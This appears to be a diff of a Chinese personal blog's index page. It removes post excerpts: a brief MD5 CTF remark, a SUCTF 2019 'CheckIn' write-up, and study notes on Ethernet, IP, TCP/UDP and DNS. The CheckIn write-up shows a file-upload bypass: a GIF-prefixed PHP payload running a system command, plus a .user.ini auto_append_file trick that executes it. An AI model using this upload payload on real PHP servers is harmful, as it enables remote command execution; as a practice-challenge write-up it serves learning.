-<p>自己想写一个长度增长的枚举，结果代码水平太差了……一般网上的脚本也是指定长度……唉，我还是用答案叭</p>
-<p>争取以后自己写一个顺手的截断的枚举（php会不会更好使……），这玩意用到的时候没有就挺恶心的………</p>
-<p>后面两个就直接用数组绕过就行了……</p>
-<p><img src="/images/BJDCTF2020-Easy-MD5/image-20210210180610545.png" alt="image-20210210180610545"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/09/SUCTF-2019-CheckIn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/09/SUCTF-2019-CheckIn/" class="post-title-link" itemprop="url">SUCTF-2019-CheckIn</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-02-09 11:55:39 / 修改时间：13:31:06" itemprop="dateCreated datePublished" datetime="2021-02-09T11:55:39+08:00">2021-02-09</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h4><h6 id="1-题目：文件上传利用-user-ini"><a href="#1-题目：文件上传利用-user-ini" class="headerlink" title="1.题目：文件上传利用.user.ini"></a>1.题目：文件上传利用.user.ini</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>em，这道题把前面的知识点基本上都概括了……但是文件后缀的检查一直无法绕过，学习了一波……</p>
-<p>关于.user.ini文件的知识：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190824211552-4c92f9fe-c671-1.png" alt="img"></p>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">dalao的文章解释的很清楚</a></p>
-<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000011552335?utm_source=tag-newest">更加细化的说明</a></p>
-<p>如果要用到.user.ini,特征之一就是在上传到.user.ini的文件夹下，也要有可执行的正常php文件。</p>
-<p><img src="/images/SUCTF-2019-CheckIn/image-20210209132326985.png" alt="image-20210209132326985"></p>
-<p>这道题的文件结构恰好是这样的（太恰好了……）</p>
-<p>所以常规绕过上传一个jpg结尾的图片一句话木马，在上传.user.ini对图片包含在php文件中解析</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;system(&#39;cat &#x2F;flag&#39;); </span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line">auto_append_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><img src="/images/SUCTF-2019-CheckIn/image-20210209132911616.png" alt="image-20210209132911616"></p>
-<p>访问时就自动执行查出flag</p>
-<blockquote>
-<p>唉，用菜刀一直连不上去……</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" class="post-title-link" itemprop="url">计算机网络</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-02-06 13:34:06" itemprop="dateCreated datePublished" datetime="2021-02-06T13:34:06+08:00">2021-02-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-03 10:22:26" itemprop="dateModified" datetime="2021-03-03T10:22:26+08:00">2021-03-03</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h4><h5 id="1-球鞋网络（Sneakernet）"><a href="#1-球鞋网络（Sneakernet）" class="headerlink" title="1.球鞋网络（Sneakernet）"></a>1.球鞋网络（Sneakernet）</h5><p>​    可用于任何使用物理媒体在计算机之间传输数据的情况,而不是使用电子网络。早期通过纸卡或磁带传递计算机信息。现在用于大型资料的传输，如超大型的望远镜数据信息。</p>
-<blockquote>
-<p>Never underestimate the bandwidth of a <a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Station_wagon">station wagon</a> full of tapes hurtling down the highway.<br>—<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Andrew_S._Tanenbaum">Tanenbaum, Andrew S.</a> (1989).</p>
-<p><em>永远不要低估一台<strong>正在高速公路上飞驰又</strong>满载磁带的卡车的带宽</em></p>
-</blockquote>
-<h5 id="2-局域网"><a href="#2-局域网" class="headerlink" title="2.局域网"></a>2.局域网</h5><p>​    计算机近距离构成的小型网络称为局域网，LAN。</p>
-<h6 id="—以太网（Ethernet）："><a href="#—以太网（Ethernet）：" class="headerlink" title="—以太网（Ethernet）："></a>—以太网（Ethernet）：</h6><p>1.最简单形式：一条以太网电线连接数台计算机，数据以电信号的形式进行传递。以太网需要每台计算机有唯一的媒体访问控制地址，简称MAC地址。此地址放在头部，作为数据的前缀发送到网络中。如此，计算机只需要监听以太网电缆，只有识别出MAC地址，才会处理数据。</p>
-<p>2.多台电脑共享一个传输媒介，这种方法叫“载波侦听多路访问”，简称“CSMA”。多态电脑进行监听载体，数据传输的速度称为“带宽”。      </p>
-<p>3.当位于同一网络的两台以上的计算机想要同时传输信息时会产生冲突，此时计算机检测到冲突并停止一定时间来避免冲突。一种方案是停止1s+随机时间，另一种是停止1s、2s、4s、8s……，这被称为“指数退避”。</p>
-<p>4.冲突域：为了<strong>减少冲突</strong>和<strong>提高效率</strong>，需要减少同一载体中设备的数量。载体和其中的设备总称为“冲突域”。</p>
-<p>5.交换机（switch）：使用交换机将一个冲突域拆分为两个冲突域，减少冲突域的范围。</p>
-<p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210206143850712.png" alt="image-20210206143850712"></p>
-<p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210206144159422.png" alt="image-20210206144159422"></p>
-<p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210206144527243.png" alt="image-20210206144527243"></p>
-<p>交换机位于两个更小的网络之间，必要时才会在两个网络间传输数据。交换机会记录一个列表，列表上写着哪个MAC地址在哪边网络。这样，a—&gt;c 和 d—&gt;f的传输可以同时发生。但是，若f—&gt;a，则数据会通过交换机且两个网络都会被占用。</p>
-<p>6.路由（routing）：大型网络中，从一个节点到另一个节点通常有许多路线。如果两个计算机或网路相隔遥远，那么传输会通过更多的关口也就是冲突域，导致冲突机会增加，产生高延迟。因此，最简单的方法是分配一条专用的通信线路，就像早期的电话。将线路转接到正确线路的方式为<strong>“电路交换”</strong>。</p>
-<p>7.<strong>“报文交换”</strong>：报文交换是以报文为数据交换的单位，报文携带有目标地址、源地址等信息，在交换结点采用存储转发的传输方式。报文交换可以使用不同的路由(routes)，使通信跟具有容错性（不会因为某条线路受损而导致无法通信）。<strong>跳数</strong>：信息沿着路由跳转的次数叫“跳数”（记录跳数可以分辨出路由问题）。<strong>“跳数限制”</strong>：如果看到某条信息的跳数很高，就知道路由肯定出问题了。<strong>报文交换的缺点：</strong>报文比较大时会堵塞网络，英文只有把整个报文从一战转到下一站后，才能继续传递其他报文。解决方法是将大报文分成许多小块，称为：<strong>“数据包”</strong>。每个数据包都有目标地址，这样路由器知道应该发到哪里。报文的具体格式有<strong>“互联网协议”</strong>定义，简称<strong>IP</strong>，互联网协议标准创建于1970年代。</p>
-<p>8.<strong>IP-互联网协议</strong>：</p>
-<p>​    <strong>数据包</strong>想在互联网上传输，需要符合“互联网协议”的标准。数据包头部储存的关于数据的数据也叫<strong>“元数据”</strong>。如果只包含地址，数据到达之后，计算机不知道把数据包给哪个程序使用。因此需要在IP之上开发更高级的协议。其中，最简单、最常见的叫<strong>“用户数据报协议”</strong>，简称为“UDP”。UDP包含不同的端口号，当一个数据包到达后，接收方会读取UDP头部中的端口号，并将数据交给拥有对应端口号的程序。</p>
-<p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210206154734927.png" alt="image-20210206154734927"></p>
-<blockquote>
-<p>IP：负责把数据包送到正确的计算机；</p>
-<p>UDP：负责把数据包交给正确的程序。</p>
-</blockquote>
-<p>UDP中还有一个“CHECKSUM”(校验和)，电脑会把所有数据加在一起算出“校验和”，UDP中，校验和以16位二进制储存。若超出，则舍去高位，保留低位。当接收者接受到数据包后，会重复这个步骤。若和头部校验和一致，代表一切正常。反之，代表数据出现了问题。</p>
-<p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210206155501494.png" alt="image-20210206155501494"></p>
-<p>传输时的功率波动或线路故障都会导致数据的损失。UDP不提供数据修复或数据重发的机制，且发送方无法通过UDP得知数据包是否到达目的地。如果要求<strong>所有数据必须到达</strong>，就要用<strong>传输控制协议-TCP</strong>。</p>
-<p>9.TCP</p>
-<p>​    TCP头部也有“端口号”和”校验和”及一些特性：</p>
-<ol>
-<li>TCP数据包有序号：接收方可以根据序号把数据包排列成正确的顺序，即使到达的时间不同。</li>
-<li>TCP要求接收方的电脑收到数据包，并且校验无误后，给发送方发一个确认码，简称“ACK”，代表收到了。</li>
-<li>TCP会根据ACK发送的速度确认网络的拥挤状况，根据网络状况自动调整传输率。</li>
-<li>UDP和TCP的应用场景不同：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av372575289">王者荣耀如何使用UDP做到低延迟</a>（我就一搜还真有……不过是个噱头……</li>
-</ol>
-<p>10.DNS-域名系统</p>
-<p>​    浏览器访问DNS服务器，询问地址的IP地址为多少。得到IP后服务器会给在这个地址发TCP请求。<strong>顶级域名（TLD）</strong>在域名的最顶部，如：.com和.gov。</p>
-<p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210206181052596.png" alt="image-20210206181052596"></p>
-<p>然后是<strong>二级域名</strong>：</p>
-<p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210206181219707.png" alt="image-20210206181219707"></p>
-<p>再下一层是<strong>子域名</strong>：</p>
-<p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210206181257066.png" alt="image-20210206181257066"></p>
-<h5 id="3-万维网"><a href="#3-万维网" class="headerlink" title="3.万维网"></a>3.万维网</h5><p>1.各种超链接组成的巨大互联网络被称为万维网。为了能使网页相互连接，每个网页需要一个唯一的地址，这个地址被称为<strong>“统一资源定位器-URL”</strong>。当访问地址下服务器的指定资源时，会用到<strong>“超文本传输协议-HTTP”</strong>。如：我们想要访问“courses”，就会向服务器发送指令“GET /courses”。该指令以“ASCII编码”发送到服务器。服务器返回对应的网页资源，浏览器渲染后在屏幕上显示。HTTP中网页回应的报文中的状态码代表了访问结果：</p>
-<blockquote>
-<p>状态码200：找到网页成功返回</p>
-<p>400~499：客户端出错</p>
-</blockquote>
-<p>“超文本”的储存和发送都基于普通文本的形式，纯文本无法标记出链接。为此，出现了HTML，超文本标记语言。        </p>
-<h5 id="4-网络中立性"><a href="#4-网络中立性" class="headerlink" title="4.网络中立性"></a>4.网络中立性</h5><p>简单来说，网络中立性是指应该平等对待所有的数据包。数据包的速度与优先级应该使一样的。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1059,7 +1046,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-count">55</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
